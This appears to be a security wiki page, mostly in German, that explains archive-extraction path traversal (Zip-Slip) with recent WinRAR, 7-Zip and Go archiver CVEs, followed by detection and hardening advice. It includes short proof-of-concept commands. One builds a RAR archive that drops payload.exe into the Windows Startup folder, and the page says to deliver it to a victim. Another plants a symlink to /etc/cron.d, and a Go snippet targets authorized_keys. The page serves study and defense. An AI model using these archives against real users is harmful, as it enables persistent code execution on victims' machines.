# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Überblick

Viele Archivformate (ZIP, RAR, TAR, 7-ZIP, etc.) erlauben jedem Eintrag, einen eigenen **internen Pfad** mitzuführen. Wenn ein Extraktionsprogramm diesen Pfad blind übernimmt, wird ein manipulierte Dateiname mit `..` oder einem **absoluten Pfad** (z. B. `C:\Windows\System32\`) außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben.
Diese Art von Schwachstelle ist weithin bekannt als *Zip-Slip* oder **archive extraction path traversal**.

Die Auswirkungen reichen vom Überschreiben beliebiger Dateien bis hin zum direkten Erreichen von **remote code execution (RCE)** durch Ablegen einer Nutzlast in einem **auto-run**-Ort wie dem Windows *Startup*-Ordner.

## Ursache

1. Attacker erstellt ein Archiv, in dem ein oder mehrere File-Header Folgendes enthalten:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Victim extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut (oder symlinks folgt) statt ihn zu bereinigen oder die Extraktion unterhalb des gewählten Verzeichnisses zu erzwingen.
3. Die Datei wird an einem von Attacker kontrollierten Ort geschrieben und beim nächsten Auslösen dieses Pfads vom System oder Nutzer ausgeführt/geladen.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.
A malicious RAR archive containing an entry such as:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
würden **außerhalb** des ausgewählten Ausgabeordners und im *Startup*-Ordner des Benutzers landen. Nach der Anmeldung führt Windows dort automatisch alles aus, was sich dort befindet, und ermöglicht so *persistente* RCE.

### Erstellen eines PoC-Archivs (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Verwendete Optionen:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Liefern Sie `evil.rar` an das Opfer und weisen Sie es an, die Datei mit einem verwundbaren WinRAR-Build zu entpacken.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Neuere Fälle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Fehler**: ZIP-Einträge, die **symbolische Links** sind, wurden beim Extrahieren dereferenziert, wodurch Angreifer das Zielverzeichnis verlassen und beliebige Pfade überschreiben konnten. Benutzerinteraktion ist nur das *Öffnen/Extrahieren* des Archives.
* **Betroffen**: 7-Zip 21.02–24.09 (Windows & Linux builds). Behoben in **25.00** (Juli 2025) und später.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Schnelles PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Fehler**: `archiver.Unarchive()` folgt `../`-Pfaden und symlinked ZIP-Einträgen und schreibt außerhalb von `outputDir`.
* **Betroffen**: `github.com/mholt/archiver` ≤ 3.5.1 (Projekt inzwischen veraltet).
* **Behebung**: Wechsel zu `mholt/archives` ≥ 0.1.0 oder Implementierung von Canonical-Path-Checks vor dem Schreiben.
* **Minimale Reproduktion**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Erkennungstipps

* **Statische Inspektion** – Archiv-Einträge auflisten und jeden Namen markieren, der `../`, `..\\`, *absolute Pfade* (`/`, `C:`) enthält oder Einträge vom Typ *symlink*, deren Ziel außerhalb des Extraktionsverzeichnisses liegt.
* **Kanonisierung** – Sicherstellen, dass `realpath(join(dest, name))` weiterhin mit `dest` beginnt. Andernfalls ablehnen.
* **Sandbox-Extraktion** – In ein temporäres Verzeichnis mit einem *sicheren* Extractor dekomprimieren (z. B. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) und verifizieren, dass die resultierenden Pfade im Verzeichnis bleiben.
* **Endpoint-Überwachung** – Alarmieren bei neuen ausführbaren Dateien, die kurz nach dem Öffnen eines Archives durch WinRAR/7-Zip/etc. in `Startup`/`Run`/`cron` geschrieben werden.

## Minderung & Härtung

1. **Extractor aktualisieren** – WinRAR 7.13+ und 7-Zip 25.00+ implementieren Pfad-/Symlink-Sanitierung. Beide Tools haben weiterhin kein Auto-Update.
2. Archive mit “**Do not extract paths**” / “**Ignore paths**” extrahieren, wenn möglich.
3. Unter Unix Privilegien reduzieren & ein **chroot/namespace** mounten, bevor extrahiert wird; unter Windows **AppContainer** oder eine Sandbox verwenden.
4. Wenn Sie eigenen Code schreiben: vor dem Erstellen/Schreiben mit `realpath()`/`PathCanonicalize()` normalisieren und jeden Eintrag ablehnen, der das Zielverzeichnis verlässt.

## Weitere betroffene / historische Fälle

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## Referenzen

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
